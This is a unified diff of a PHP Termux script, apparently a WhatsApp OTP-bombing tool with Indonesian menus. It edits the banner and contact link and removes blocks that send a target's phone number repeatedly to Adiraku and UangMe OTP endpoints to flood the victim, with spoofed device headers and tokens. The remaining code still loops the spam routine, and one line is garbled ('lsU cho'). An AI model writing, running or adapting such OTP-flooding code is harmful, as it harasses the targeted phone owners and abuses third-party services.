@@ -206,44 +206,18 @@ function processGitHubFiles($files, $localFolder) {
 
 lagi:
 clear();
-echo color("green","⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
-⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
-⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
-⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
-⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
-⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
-⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
-⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
-⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
-⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
-⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
-⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
-⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
-⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
-⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
-================================\n");
-
 echo color("yellow"," WARNING ! ! !\n");
-
-echo color("red"," DOSA DI TANGGUNG ANDA😹!
-================================\n");
-
+echo color("red"," DOSA DI TANGGUNG ANDA !\n");
 sleep(5);
 clear();
 
 $versi = file_get_contents('version.txt');
-echo color("red","⣴⣾⣿⣿⣿⣿⣷⣦
-⣿⣿⣿⣿⣿⣿⣿⣿
-⡟⠛⠽⣿⣿⠯⠛⢻
-⣧°⣀⡾⢷⣀°⣼
- ⡏⢽⢴⡦⡯⢹ 
- ⠙⢮⣙⣋⡵⠋");
-echo color("green"," [ Rizky.088 ]   ");
+echo color("green"," 𝕊𝔼-ℙ𝔸𝕄   ");
 echo color("nevy","Version ".$versi."\n\n\n");
 
-echo color("green"," 1: Whatsapp\n");
-echo color("green"," 2: Pesan Manual (isi text bebas)\n");
-echo color("yellow"," 3: Support Admin\n\n");
+echo color("green"," 1. Whatsapp\n");
+echo color("green"," 2. Pesan Manual (isi text bebas)\n");
+echo color("yellow"," 3. Support Admin\n\n");
 echo color("green"," Pilih : ");
 $aaa1 = trim(fgets(STDIN));
 if ($aaa1 == 1) {
@@ -254,7 +228,7 @@ if ($aaa1 == 2) {
 }
 if ($aaa1 == 3) {
   clear();
-  $url = "https://www.instagram.com/rizky.0_o?igsh=bGJ6dGdvYnR6Y3c2";
+  $url = "https://github.com/hanx-666/spam-wa/blob/e6c28c4de6ca768f9f014f57a1f2fb831c674d8a/donasi.jpg";
   shell_exec("termux-open-url $url");
   echo color("green","???");
   exit();
@@ -1100,143 +1074,7 @@ else{
 }
 
 
-
-
-//ADIRAKU
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
-  CURLOPT_RETURNTRANSFER => true,
-CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type:  application/json; charset=utf-8'
-  ),
-));
-$response = curl_exec($curl);
-//echo $response;
-$result = fetch_value($response,'{"message":"','","');
-if ($result == 'success') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-}
-else{
-  echo " UANGME ".$response."\n";
-}
-
-
-//ADIRAKU
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
-  CURLOPT_RETURNTRANSFER => true,
-CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type:  application/json; charset=utf-8'
-  ),
-));
-$response = curl_exec($curl);
-//echo $response;
-$result = fetch_value($response,'{"message":"','","');
-if ($result == 'success') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-}
-else{
-  echo " UANGME ".$response."\n";
-}
-
-
-
-//ADIRAKU
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
-  CURLOPT_RETURNTRANSFER => true,
-CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type:  application/json; charset=utf-8'
-  ),
-));
-$response = curl_exec($curl);
-//echo $response;
-$result = fetch_value($response,'{"message":"','","');
-if ($result == 'success') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-}
-else{
-  echo " UANGME ".$response."\n";
-}
-
-
-
-//ADIRAKU
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
-  CURLOPT_RETURNTRANSFER => true,
-CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
-  CURLOPT_HTTPHEADER => array(
-    'Content-Type:  application/json; charset=utf-8'
-  ),
-));
-$response = curl_exec($curl);
-//echo $response;
-$result = fetch_value($response,'{"message":"','","');
-if ($result == 'success') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-}
-else{
-  echo " UANGME ".$response."\n";
-}
-
-
-//UANGME
-$curl = curl_init();
-curl_setopt_array($curl, array(
-  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
-  CURLOPT_RETURNTRANSFER => true,
-CURLOPT_TIMEOUT => 10,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_HTTPHEADER => array(
-    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
-    'android_id: b787045b140c631f',
-    'app_version: 300504',
-    'brand: samsung',
-    'carrier: 00',
-    'Content-Type: application/x-www-form-urlencoded',
-    'country: 510',
-    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
-    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
-    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
-    'lan: in_ID',
-    'model: SM-G965N',
-    'ns: wifi',
-    'os: 1',
-    'timestamp: 1732178536',
-    'tz: Asia%2FBangkok',
-    'User-Agent: okhttp/3.12.1',
-    'v: 1',
-    'version: 28'
-  ),
-));
-$response = curl_exec($curl);
-//echo $response;
-$result = fetch_value($response,'{"code":"','","');
-if ($result == '200') {
-  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
-}
-else{
-  echo " UANGME ".$response."\n";
-}
-
-
-lsU cho color("yellow"," Done Sensei..\n");
+echo color("yellow"," Done Sensei..\n");
 sleep(3);
 goto lagi;
 
